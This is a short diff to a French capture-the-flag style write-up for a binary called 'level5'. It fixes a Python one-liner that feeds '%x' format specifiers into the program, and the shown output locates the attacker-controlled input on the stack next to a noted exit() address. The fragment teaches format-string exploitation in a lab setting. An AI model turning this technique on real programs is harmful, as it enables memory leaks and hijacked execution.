@@ -116,7 +116,7 @@ L'adresse de exit() est 0x08049838.
 
 On va afficher la memoire jusqu'au exit.
 
-$ python -c 'print "AAAA" + "%x "\*8' | ./level5
+$ python -c 'print "AAAA" + "%x "*8' | ./level5
 AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825
 
 Donc l'adresse d'exit est en 4eme position.
